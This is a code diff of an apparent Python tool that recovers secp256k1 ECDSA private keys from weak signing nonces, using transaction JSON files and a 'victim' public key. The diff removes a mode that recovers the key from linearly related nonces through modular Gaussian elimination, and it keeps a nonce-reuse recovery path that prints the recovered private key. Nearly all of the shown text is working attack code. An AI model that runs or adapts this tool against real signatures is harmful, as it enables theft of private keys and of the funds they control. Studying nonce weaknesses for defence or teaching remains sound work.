@@ -48,75 +48,17 @@ def recover_from_reuse(txs: List[Transaction]) -> int:
     return x
 
 
-def gauss_solve_mod(M, b, n=N):
-    """Solve M*x=b over Z_n with Gaussian elimination (square matrix)."""
-    m = len(M)
-    A = [list(map(lambda x: x % n, M[i])) + [b[i] % n] for i in range(m)]
-
-    col = 0
-    for row in range(m):
-        pivot = None
-        for r in range(row, m):
-            if A[r][col] % n != 0:
-                pivot = r
-                break
-        if pivot is None:
-            raise ValueError("Singular matrix (no pivot). Regenerate txs (different randomness).")
-        A[row], A[pivot] = A[pivot], A[row]
-
-        inv_p = modinv(A[row][col], n)
-        for c in range(col, m + 1):
-            A[row][c] = (A[row][c] * inv_p) % n
-
-        for r in range(m):
-            if r == row:
-                continue
-            factor = A[r][col] % n
-            if factor == 0:
-                continue
-            for c in range(col, m + 1):
-                A[r][c] = (A[r][c] - factor * A[row][c]) % n
-
-        col += 1
-        if col >= m:
-            break
-
-    return [A[i][m] % n for i in range(m)]
-
-
-def recover_from_linear(txs: List[Transaction]) -> Tuple[int, int, int]:
-    """Recover (a,b,x) when k_i = a*z_i + b (mod n). Needs 3 signatures."""
-    if len(txs) != 3:
-        raise ValueError("linear mode needs exactly 3 tx files")
-
-    rows = []
-    rhs = []
-    for tx in txs:
-        z, r, s = tx_z_r_s(tx)
-        rows.append([(s * z) % N, s % N, (-r) % N])
-        rhs.append(z % N)
-
-    a, b, x = gauss_solve_mod(rows, rhs, N)
-    return a, b, x
-
-
 def main():
-    p = argparse.ArgumentParser(description="Recover a secp256k1 private key from weak ECDSA nonce patterns.")
-    p.add_argument("--mode", choices=["reuse", "linear"], required=True)
-    p.add_argument("--tx", nargs="+", required=True, help="paths to tx JSON files (2 for reuse, 3 for linear)")
+    p = argparse.ArgumentParser(description="Recover a secp256k1 private key from weak ECDSA nonce reuse.")
+    p.add_argument("--mode", choices=["reuse"], required=True)
+    p.add_argument("--tx", nargs="+", required=True, help="paths to tx JSON files (2 for reuse)")
     p.add_argument("--pubkey", default=None, help="optional: victim public key hex to verify recovered key")
     args = p.parse_args()
 
     txs = [load_tx(x) for x in args.tx]
 
-    if args.mode == "reuse":
-        x = recover_from_reuse(txs)
-        Log.ok(f"Recovered private key x = {hex(x)}")
-    else:
-        a, b, x = recover_from_linear(txs)
-        Log.ok(f"Recovered a = {hex(a)}")
-        Log.ok(f"Recovered b = {hex(b)}")
-        Log.ok(f"Recovered private key x = {hex(x)}")
+    x = recover_from_reuse(txs)
+    Log.ok(f"Recovered private key x = {hex(x)}")
 
     # Verify if pubkey provided
     if args.pubkey:
@@ -137,7 +79,6 @@ def main():
             Log.ok("Verification OK: recovered key matches the provided pubkey/address.")
         else:
             Log.warn("Verification FAILED: recovered key does not match the provided pubkey/address.")
-            Log.warn("Tip: in linear mode, regenerate txs if the matrix was (unluckily) singular.")
 
 
 if __name__ == "__main__":
